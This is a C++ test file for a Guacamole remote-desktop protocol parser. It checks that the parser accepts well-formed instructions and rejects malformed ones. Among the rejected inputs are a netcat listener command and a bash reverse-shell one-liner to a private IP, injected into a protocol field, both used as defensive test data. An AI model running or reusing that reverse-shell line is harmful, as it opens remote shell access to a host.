#include "../include/guacparser.h"
#include <cassert>
#include <iostream>
#include <stdlib.h>
#include <string>

std::string cvt_state(ParserState state) {
    switch (state) {
    case ParserState::READY:
        return "READY";
    case ParserState::PARSING:
        return "PARSING";
    case ParserState::INVALID:
        return "INVALID";
    case ParserState::DENIED_OPCODE:
        return "DENIED_OPCODE";
    }
}

void test_parsing(std::string input, ParserState expected, GuacParser parser) {
    parser.Parse(input.data(), input.size());

    if (parser.GetState() != expected)
        std::cerr << "state: " << cvt_state(parser.GetState())
                  << ", expected: " << cvt_state(expected)
                  << "\n\tfor input: " << input << std::endl;
    // assert(parser.GetState() == expected);
    // std::cerr << "state: " << cvt_state(parser.GetState())
    //           << ", expected: " << cvt_state(expected) << std::endl;
}

int main(int argc, char **argv) {

    // Valid opcode
    test_parsing("6.select,3.ssh;", ParserState::READY, GuacParser());
    test_parsing("4.size,4.1680,3.933,2.96;", ParserState::READY, GuacParser());
    test_parsing(
        "5.audio,8.audio/L8,9.audio/L16;5.video;5.image,10.image/jpeg,9.image/"
        "png,10.image/webp;8.timezone,13.Europe/"
        "Berlin;4.name,9.guacadmin;7.connect,13.VERSION_1_5_0,9.localhost,0.,2."
        "22,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,"
        "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.;",
        ParserState::READY, GuacParser());
    test_parsing("4.argv,1.0,10.text/plain,12.color-scheme;",
                 ParserState::READY, GuacParser());
    test_parsing("5.mouse,3.988,3.369,1.0;", ParserState::READY, GuacParser());
    test_parsing("3.key,3.109,1.1;", ParserState::READY, GuacParser());

    // Valid opcode, with partials
    {
        auto parser = GuacParser();
        test_parsing("5.mouse,3.988", ParserState::PARSING, parser);
        test_parsing(",3.369,1.0;", ParserState::READY, parser);
    }

    {
        auto parser = GuacParser();
        test_parsing("4.size,4.168", ParserState::PARSING, parser);
        test_parsing("0,3.933,2.96;", ParserState::READY, parser);
    }

    {
        auto parser = GuacParser();
        test_parsing(
            "5.audio,8.audio/L8,9.audio/L16;5.video;5.image,10.image/"
            "jpeg,9.image/"
            "png,10.image/webp;8.timezone,13.Europe/Berlin;4.name,9.gu",
            ParserState::PARSING, parser);
        test_parsing(
            "acadmin;7.connect,13.VERSION_1_5_0,9.localhost,0.,2.22,0.,0.,"
            "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,"
            "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.;",
            ParserState::READY, parser);
    }

    // Invalid Guacamole
    test_parsing("nonsense", ParserState::INVALID, GuacParser());
    test_parsing("ncat -l -p 1337", ParserState::INVALID, GuacParser());
    test_parsing("8,nonsense", ParserState::INVALID, GuacParser());
    test_parsing("eight.nonsense", ParserState::INVALID, GuacParser());
    test_parsing("5.audio,1.6,31.audio/L16;rate=invalid,channels=2;",
                 ParserState::INVALID, GuacParser());

    // Invalid opcode length
    test_parsing("3.badlength;", ParserState::INVALID, GuacParser());
    test_parsing("-8.negative;", ParserState::INVALID, GuacParser());
    test_parsing("0.zero;", ParserState::INVALID, GuacParser());
    test_parsing("4.argv,100.0,10.text/plain,12.color-scheme;",
                 ParserState::INVALID, GuacParser());
    test_parsing("4.argv,1.1,10.text/plain,9.font-name;4.argv,1.2,10.text/"
                 "plain,9.font-size;3.ack,1.1,2.OK,1.0;3.ack/bin/bash -i >& "
                 "/dev/tcp/10.10.17.1/1337 0>&1,1.1,2.OK,1.0;",
                 ParserState::INVALID, GuacParser());

    // Invalid characters
    test_parsing("10.ὠnonsenseὠ;", ParserState::INVALID, GuacParser());
    test_parsing("9.😊nonsense;", ParserState::INVALID, GuacParser());

    // No closing semicolon after first opcode
    test_parsing("6.abCdeF3.foo;", ParserState::INVALID, GuacParser());

    // No commas
    test_parsing("5.ghiJk,3.foo6.barbaz;", ParserState::INVALID, GuacParser());
    test_parsing("7.lmopqrs3.doc5.frotz;", ParserState::INVALID, GuacParser());
    test_parsing("4.argv,1.5,10.text/plain9.font-size;", ParserState::INVALID,
                 GuacParser());

    // Invalid guacamole, with partials
    {
        auto parser = GuacParser();
        test_parsing("5.audio,8.audio/L8,9.au", ParserState::PARSING, parser);
        test_parsing(
            "dio/L16;5.video;5.image,10.image/jpeg,9.image/png,10.image/"
            "webp;8.invalid,13.Europe/"
            "Berlin;4.name,9.guacadmin;7.connect,13.VERSION_1_5_0,9.localhost,"
            "0.,2."
            "22,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,"
            "0.,"
            "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.;",
            ParserState::INVALID, parser);
    }

    return 0;
}
